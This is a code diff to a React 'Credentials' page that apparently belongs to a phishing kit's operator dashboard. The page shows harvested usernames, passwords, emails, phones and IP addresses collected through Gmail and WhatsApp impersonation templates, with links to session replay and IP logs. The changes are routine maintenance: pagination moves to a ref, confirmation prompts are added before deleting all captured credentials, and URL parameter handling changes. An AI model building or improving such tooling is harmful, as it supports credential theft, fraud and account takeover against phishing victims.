@@ -1,18 +1,6 @@
-import { useEffect, useState, useCallback } from 'react'
-import { api, Session } from '../api/client'
+import { useEffect, useState, useCallback, useRef } from 'react'
+import { api, Session, Credential } from '../api/client'
 import { exportCSV } from '../utils/export'
-
-interface Credential {
-  id: string
-  session_id: string
-  template_id: string | null
-  username: string | null
-  password: string | null
-  email: string | null
-  phone: string | null
-  ip_address: string | null
-  created_at: number
-}
 
 function relativeTime(ts: number): string {
   const seconds = Math.floor(Date.now() / 1000 - ts)
@@ -45,7 +33,9 @@ const TEMPLATE_ICONS: Record<string, string> = {
   gmail: '✉', whatsapp: '💬'
 }
 
-const CODE_PARAM = new URLSearchParams(window.location.search).get('code') || ''
+function getCodeParam(): string {
+  return new URLSearchParams(window.location.search).get('code') || ''
+}
 
 export default function Credentials() {
   const [creds, setCreds] = useState<Credential[]>([])
@@ -55,52 +45,54 @@ export default function Credentials() {
   const [search, setSearch] = useState('')
   const [sessions, setSessions] = useState<Session[]>([])
   const [sessionFilter, setSessionFilter] = useState('')
-  const [offset, setOffset] = useState(0)
+  const offsetRef = useRef(0)
   const [hasMore, setHasMore] = useState(true)
   const [loadingMore, setLoadingMore] = useState(false)
   const [paused, setPaused] = useState(false)
   const LIMIT = 50
 
-  const fetchData = useCallback(async (append = false) => {
+  const fetchData = useCallback(async (append = false, useOffset?: number) => {
+    const off = useOffset ?? (append ? offsetRef.current : 0)
     try {
       setError(null)
-      const data = await api.credentials(append ? offset : 0, LIMIT, sessionFilter)
+      const result = await api.credentials(off, LIMIT, sessionFilter)
       if (append) {
-        setCreds(prev => [...prev, ...data])
+        setCreds(prev => [...prev, ...result.entries])
       } else {
-        setCreds(data)
-        setOffset(0)
+        setCreds(result.entries)
       }
-      setHasMore(data.length >= LIMIT)
+      offsetRef.current = off + (append ? 0 : 0)
+      setHasMore(result.has_more)
     } catch (e) {
       setError(e instanceof Error ? e.message : 'Failed to load')
     } finally {
       setLoading(false)
       setLoadingMore(false)
     }
-  }, [sessionFilter, offset])
+  }, [sessionFilter])
 
   useEffect(() => {
     api.sessions().then(setSessions).catch(() => {})
   }, [])
 
   useEffect(() => {
-    setOffset(0)
+    offsetRef.current = 0
     setCreds([])
     setLoading(true)
-    fetchData(false)
+    fetchData(false, 0)
   }, [sessionFilter, fetchData])
 
   useEffect(() => {
     if (paused) return
-    const t = setInterval(() => fetchData(false), 15000)
+    const t = setInterval(() => fetchData(false, 0), 15000)
     return () => clearInterval(t)
   }, [paused, sessionFilter, fetchData])
 
   const loadMore = () => {
     setLoadingMore(true)
-    setOffset(prev => prev + LIMIT)
-    fetchData(true)
+    const nextOffset = offsetRef.current + LIMIT
+    offsetRef.current = nextOffset
+    fetchData(true, nextOffset)
   }
 
   const toggleReveal = (id: string) => {
@@ -124,10 +116,13 @@ export default function Credentials() {
   }
 
   const handleDeleteAll = async () => {
+    if (!confirm('Delete ALL captured credentials?')) return
+    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
     try {
       setError(null)
       await api.deleteAllCredentials()
       setCreds([])
+      setHasMore(false)
     } catch (e) {
       setError('Failed to delete all')
     }
@@ -209,7 +204,7 @@ export default function Credentials() {
                       <div className="text-xs text-tertiary flex items-center gap-2 flex-wrap">
                         <span className="mono">{c.template_id}</span>
                         <span>·</span>
-                        <a href={`/?code=${CODE_PARAM}#/replay`} className="mono accent hover:underline"
+                        <a href={`/?code=${getCodeParam()}#/replay`} className="mono accent hover:underline"
                           title={c.session_id}>{c.session_id.substring(0, 16)}</a>
                       </div>
                     </div>
@@ -244,7 +239,7 @@ export default function Credentials() {
                   </div>
                   <div className="bg-primary radius-card p-2.5">
                     <div className="text-[10px] text-tertiary uppercase tracking-wider">IP Address</div>
-                    <a href={`/?code=${CODE_PARAM}#/ips`}
+                    <a href={`/?code=${getCodeParam()}#/ips`}
                       className="text-xs accent mono mt-1 block break-all hover:underline"
                       title="View IP logs">{c.ip_address || 'unknown'}</a>
                   </div>
